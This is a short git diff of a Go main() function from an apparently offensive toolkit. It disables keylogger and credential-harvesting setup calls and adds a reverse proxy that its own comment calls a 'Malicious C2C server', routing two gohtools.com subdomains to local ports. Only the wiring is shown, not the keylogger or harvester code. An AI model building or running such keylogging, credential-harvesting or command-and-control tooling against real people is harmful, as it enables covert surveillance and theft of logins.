@@ -95,11 +95,19 @@ func main() {
 	// credsHarvestingServ.StartHarvesting()
 
 	// KeyLogger
-	listenAddr := "localhost:8080"
-	wsAddr := listenAddr
-	jsTemplateFilePath := "logger.js"
-	keyLogger := http.NewKeyLogger(listenAddr, wsAddr, jsTemplateFilePath)
+	// listenAddr := "localhost:8080"
+	// wsAddr := listenAddr
+	// jsTemplateFilePath := "logger.js"
+	// keyLogger := http.NewKeyLogger(listenAddr, wsAddr, jsTemplateFilePath)
 
-	keyLogger.StartLogger()
+	// keyLogger.StartLogger()
+
+	// Malicious C2C server with Reverse Proxy/Virtual Hosts
+	proxies := make(map[string]string)
+	proxies["1.gohtools.com"] = "http://localhost:8001"
+	proxies["2.gohtools.com"] = "http://localhost:8002"
+
+	reverseProxy := http.NewReverseProxy("0.0.0.0:80", proxies)
+	reverseProxy.StartReverseProxy()
 
 }
